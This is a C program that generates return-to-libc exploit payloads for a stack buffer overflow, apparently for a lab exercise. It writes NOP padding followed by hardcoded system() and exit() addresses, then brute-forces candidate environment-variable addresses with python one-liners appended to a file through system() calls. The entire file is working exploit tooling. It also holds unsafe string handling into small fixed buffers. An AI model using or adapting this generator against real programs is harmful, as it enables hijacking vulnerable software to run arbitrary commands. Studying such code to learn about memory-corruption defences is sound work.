#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char* little_endian(char *addr) {
	// change a memory address to little endian
	char tmp[8];
	char* res=malloc(17*sizeof(char));

	tmp[0] = addr[8];
	tmp[1] = addr[9];
	tmp[2] = addr[6];
	tmp[3] = addr[7];
	tmp[4] = addr[4];
	tmp[5] = addr[5];
	tmp[6] = addr[2];
	tmp[7] = addr[3];
	int i, j = 0;
	for(i = 0; i < 8; ++i) {
		if(i%2 == 0) {
			res[j++] = '\\';
			res[j++] = 'x';
		}
		res[j++] = tmp[i];
	}
	res[16] = '\0';

	return res;
}

int main(int argc, char *argv[]) {
	char str[10], str_little[20], code[120];

	char *ptr = getenv(argv[1]);

	// print NOP paddings until return address, then write system() and exit() addresses
	char prev_code[100] = "python -c 'print \"\\x90\"*28 + \"\\x70\\x21\\xe6\\xb7\" + \"\\xc0\\x7f\\xe5\\xb7\" + \"";

	system("rm code");
	int i = 0;

	// Increase index range if the environment variable is not found
	for(i; i < 20; ++i) { 
		sprintf(str, "%p", ptr+i);
		strcpy(str_little, little_endian(str));
		strcpy(code, prev_code);
		// append possible environment variable address
		strcat(code, str_little);
		strcat(code, "\"' >> code");

		system(code);

		sprintf(str, "%p", ptr-i);
		strcpy(str_little, little_endian(str));
		strcpy(code, prev_code);
		// append possible environment variable address
		strcat(code, str_little);
		strcat(code, "\"' >> code");

		system(code);
	}

	return 0;
}
